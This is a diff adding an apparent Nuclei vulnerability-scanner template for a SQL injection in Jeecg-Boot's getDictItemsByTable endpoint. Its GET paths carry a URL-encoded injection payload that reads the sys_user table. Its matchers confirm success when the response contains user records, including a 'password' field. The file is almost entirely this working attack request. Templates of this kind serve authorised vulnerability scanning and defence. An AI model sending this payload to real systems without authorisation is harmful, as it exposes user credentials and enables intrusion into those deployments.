@@ -1,0 +1,33 @@
+id: jeecgboot-getDictItemsByTable-sqli
+info:
+  name: Jeecg-Boot getDictItemsByTable - sqli
+  author: leadlife
+  severity: high
+  description: 
+  reference: 
+    - changting
+  classification:
+    cve-id: 
+  metadata:
+    verified: true
+    fofa-query: demo
+    hunter-query: demo
+    tips:
+    repair:
+    version:
+  tags: 2024,jeecg,jeecgboot,sqli
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/jeecg-boot/sys/ng-alain/getDictItemsByTable/'%20from%20sys_user/*,%20'/x.js"
+      - "{{BaseURL}}/sys/ng-alain/getDictItemsByTable/'%20from%20sys_user/*,%20'/x.js"
+ 
+    stop-at-first-match: true
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code == 200
+          - contains(header,'application/json')
+          - contains_all(body,'create_by','password','update_time')
+        condition: and
